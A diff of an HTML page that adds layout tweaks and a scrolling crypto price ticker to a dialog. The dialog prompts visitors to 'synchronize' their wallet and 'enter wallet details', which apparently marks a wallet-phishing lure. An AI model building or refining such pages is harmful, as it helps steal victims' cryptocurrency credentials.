@@ -9,7 +9,7 @@
 </head>
 <body>
     
-    <div style="position: relative; width: 100%; height: auto; display: flex; flex-direction: column;justify-content: center;align-items: center;">
+    <div style="position: relative; width: 100%; height: auto; display: flex; flex-direction: column;justify-content: center;align-items: center; padding-top: 40px;">
         <header style="position: relative; width: 60%;">
             <img src="logo.png" class="header-img" />
         </header>
@@ -245,7 +245,7 @@
     </div>
 
 <!-- The section for mobile phone and smaller screens-->
-<div style="position: relative; width: 100%;">
+<div class="section-3-2-container">
     <section class="section-3-2">
         <div class="section-inner-2">
             <div class="img-container"><img src="meta.png" /></div>
@@ -482,11 +482,52 @@
 
 </div>
 
-
     <dialog id="dialog">
         <div> <img height="10" width="10" src="cancel.png" id="dialog-close"  /> </div>
         <div style="position:relative ; width: 100%; height: auto; display: flex;flex-direction: column;justify-content: center; align-items: center;">
-            <div class="sliding-header" style="position: relative; width: 80%; height: 40px; border: solid 1.5px grey; margin-top: 10px;"></div>
+            <div class="sliding-header" style="position: relative; width: 80%; height: 40px; border: solid 1.5px grey; margin-top: 10px;" id="sliding-header">
+                <marquee style="display: flex; flex-direction: row; justify-content: center; align-items: center;" direction="left" behaviour="scroll" loop="infinite" scrolldelay="1" id="marq">
+                    <div style="position: relative ; display: flex; flex-direction: row; justify-content: center; align-items: center; width: 100%; height: auto;">
+                        <div style="position: relative ; display: flex; flex-direction: row; justify-content: center; align-items: center; width: 100%; height: 40px;">
+                            <div class="bit-container" data-url="https://www.coingecko.com/resource_redirect?locale=en&route=coins/bitcoin&utm_source=fastestint-chain.tools&utm_medium=coin_price_marquee_widget&utm_content=bitcoin">
+                                <div> <img src="bitcoin.png" /> </div>
+                                <div class="coin-type"> Bitcoin (BTC) <span class="money"> $28 616 (-3.15%) </span> </div>
+                            </div>
+                            <div class="bit-container" data-url="https://www.coingecko.com/resource_redirect?locale=en&route=coins/eos&utm_source=fastestint-chain.tools&utm_medium=coin_price_marquee_widget&utm_content=eos">
+                                <div> <img src="eos-eos-logo.png" /> </div>
+                                <div class="coin-type"> EOS (EOS) <span class="money"> $1.15(-4.31%) </span> </div>
+                            </div>
+                            <div class="bit-container" data-url="https://www.coingecko.com/resource_redirect?locale=en&route=coins/ethereum&utm_source=fastestint-chain.tools&utm_medium=coin_price_marquee_widget&utm_content=ethereum">
+                                <div> <img src="ethereum.png" /> </div>
+                                <div class="coin-type"> Ethereum (ETH) <span class="money"> $1,563.11 (-9.52%) </span> </div>
+                            </div>
+                            <div class="bit-container" data-url="https://www.coingecko.com/resource_redirect?locale=en&route=coins/litecoin&utm_source=fastestint-chain.tools&utm_medium=coin_price_marquee_widget&utm_content=litecoin">
+                                <div> <img src="litecoin.png" /> </div>
+                                <div class="coin-type"> Litecoin (LTC) <span class="money"> $54.52 (-5.31%) </span> </div>
+                            </div>
+                            <div class="bit-container" data-url="https://www.coingecko.com/resource_redirect?locale=en&route=coins/ripple&utm_source=fastestint-chain.tools&utm_medium=coin_price_marquee_widget&utm_content=ripple">
+                                <div> <img src="xrp-symbol-white-128.png" /> </div>
+                                <div> XRP (XRP) <span class="money"> $0.372885 (-4.52%) </span> </div>
+                            </div>
+                            <div class="bit-container" data-url="https://www.coingecko.com/resource_redirect?locale=en&route=coins/avalanche-2&utm_source=fastestint-chain.tools&utm_medium=coin_price_marquee_widget&utm_content=avalanche-2">
+                                <div> <img src="avalanche-avax-logo1.png" /> </div>
+                                <div class="coin-type"> Avalanche (AVAX) <span class="money"> $21.09 (-8.37%) </span> </div>
+                            </div>
+                            <div class="bit-container" data-url="https://www.coingecko.com/resource_redirect?locale=en&route=coins/shiba-inu&utm_source=fastestint-chain.tools&utm_medium=coin_price_marquee_widget&utm_content=shiba-inu">
+                                <div> <img src="shiba.png" /> </div>
+                                <div class="coin-type"> Shiba Inu (SHIB) <span class="money"> $0.00000974 (-4.99%) </span> </div>
+                            </div>
+                            <div class="bit-container" data-url="https://www.coingecko.com/resource_redirect?locale=en&route=coins/floki-inu&utm_source=fastestint-chain.tools&utm_medium=coin_price_marquee_widget&utm_content=floki-inu">
+                                <div> <img src="PNG_image.png" /> </div>
+                                <div class="coin-type"> Floki Inu (FLOKI) <span class="money"> $0.00000664 (-13.55%) </span> </div>
+                            </div>
+                            <div class="bit-container">
+                                <div class="powered"> Powered by <span class="money" style="color: darkgreen;"> CoinGecko </span> </div>
+                            </div>
+                        </div>
+                    </div>
+                </marquee>
+            </div>
         </div>
         <div class="sync-msg"> SYNCHRONIZE YOUR WALLET </div>
         <div class="sync-msg2"> SECURELY ENTER WALLET DETAILS TO PROCEED </div>
